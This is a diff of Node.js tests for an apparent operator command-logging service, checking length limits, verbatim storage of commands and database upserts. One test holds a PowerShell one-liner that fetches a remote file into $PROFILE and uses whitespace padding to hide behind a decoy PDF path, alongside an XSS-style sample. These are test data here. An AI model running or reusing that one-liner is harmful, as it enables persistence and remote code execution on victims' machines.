@@ -7,8 +7,10 @@ require('dotenv').config({ path: require('path').join(__dirname, '../.env') });
 const { test, describe, before, after } = require('node:test');
 const assert = require('node:assert/strict');
 
+const crypto = require('crypto');
 const db = require('../db');
 const { validateInputLengths } = require('../middleware/sanitize.middleware');
+const { sanitizeObject, sanitizeLogData, MAX_COMMAND_LENGTH } = require('../utils/sanitize');
 const RelationsModel = require('../models/relations');
 const RelationAnalyzer = require('../services/relations/relationAnalyzer');
 const { UserCommandAnalyzer } = require('../services/relations/analyzers');
@@ -52,6 +54,47 @@ describe('validateInputLengths', () => {
 
   test('returns empty array for array input', () => {
     assert.deepEqual(validateInputLengths([]), []);
+  });
+
+  test(`accepts a ${MAX_COMMAND_LENGTH}-character command and rejects one more`, () => {
+    assert.equal(MAX_COMMAND_LENGTH, 32768);
+    assert.deepEqual(validateInputLengths({ command: 'x'.repeat(MAX_COMMAND_LENGTH) }), []);
+    const errors = validateInputLengths({ command: 'x'.repeat(MAX_COMMAND_LENGTH + 1) });
+    assert.equal(errors.length, 1);
+    assert.match(errors[0], /command must not exceed 32768 characters/);
+  });
+});
+
+// ── Suite 1b: command-like fields are stored verbatim (unit — no DB) ─────────
+
+describe('command sanitization', () => {
+  // Both passes a log write goes through: sanitizeRequestMiddleware then
+  // sanitizeLogMiddleware.
+  const store = (fields) => sanitizeLogData(sanitizeObject(fields));
+
+  test('operator PowerShell one-liner survives unchanged (regression: >> became &gt;&gt;)', () => {
+    const cmd = 'Powershell.exe -c "C:\\Windows\\System32\\curl -kL https://raw.githubusercontent.com/x/y/refs/heads/master/.lsp/readme.md >> $PROFILE"; '
+      + 'Start-Process https://corporate.example.com/a.pdf  #' + ' '.repeat(170)
+      + '\\\\corporate.example.com\\2026\\documents\\Voting Results.pdf';
+    assert.equal(store({ command: cmd }).command, cmd);
+  });
+
+  test('redirections, tag-shaped text, data:/javascript: and on...= are not rewritten', () => {
+    for (const cmd of [
+      'cat <file >out.txt 2>&1',
+      'echo "<script>alert(1)</script>" > x.html',
+      'curl data:text/plain,hi; open javascript:void(0)',
+      'Set-ItemProperty -Name onboarding=1; reg add HKCU\\x /v onload=1',
+      "Get-Content 'C:\\a b\\c.txt' | Out-File \\\\host\\share\\d.txt"
+    ]) {
+      assert.equal(store({ command: cmd }).command, cmd, `changed: ${cmd}`);
+    }
+  });
+
+  test('notes and nested template fields are verbatim too; NUL is stripped', () => {
+    assert.equal(store({ notes: 'a > b && c < d' }).notes, 'a > b && c < d');
+    assert.equal(sanitizeObject({ data: { command: 'x >> y' } }).data.command, 'x >> y');
+    assert.equal(store({ command: 'who\u0000ami' }).command, 'whoami');
   });
 });
 
@@ -235,6 +278,37 @@ describe('operation-tag filtering on getRelations', () => {
     const sources = results.map(r => r.source);
     assert.ok(!sources.some(s => s === 't_filter_ip_9999'), 'should not see tag-9999');
     assert.ok(!sources.some(s => s === 't_filter_ip_8888'), 'should not see tag-8888');
+  });
+});
+
+// ── Suite 5: long values in relations (integration) ──────────────────────────
+// B-tree index entries max out around 2.7 KB; relation values are indexed by
+// md5/hash so commands up to MAX_COMMAND_LENGTH must upsert cleanly.
+
+describe('long command relations', () => {
+  const TEST_USER = 't_long_cmd_user_' + Date.now();
+  // Base64 barely compresses — the worst case for index entry size.
+  const longCmd = 'powershell -enc ' + crypto.randomBytes(24576).toString('base64').slice(0, MAX_COMMAND_LENGTH - 16);
+
+  after(async () => {
+    await db.query(`DELETE FROM relations WHERE source_value = $1 OR source_type = 't_long'`, [TEST_USER]);
+  });
+
+  test(`user→command relation with a ${MAX_COMMAND_LENGTH}-character command is stored`, async () => {
+    assert.equal(longCmd.length, MAX_COMMAND_LENGTH);
+    const row = await RelationsModel.upsertRelation('username', TEST_USER, 'command', longCmd, { timestamp: new Date() });
+    assert.ok(row, 'upsert returned a row');
+    assert.equal(row.metadata.originalCommand, longCmd);
+  });
+
+  test('upserting the same long pair twice merges into one row (md5 conflict target)', async () => {
+    const other = longCmd.slice(0, -1) + 'Z';
+    await RelationsModel.upsertRelation('t_long', longCmd, 't_long', other, {});
+    const second = await RelationsModel.upsertRelation('t_long', longCmd, 't_long', other, {});
+    assert.equal(second.strength, 2, 'second upsert updated the existing row');
+    const { rows } = await db.query(
+      `SELECT count(*)::int AS n FROM relations WHERE source_type = 't_long' AND source_value = $1`, [longCmd]);
+    assert.equal(rows[0].n, 1);
   });
 });
 
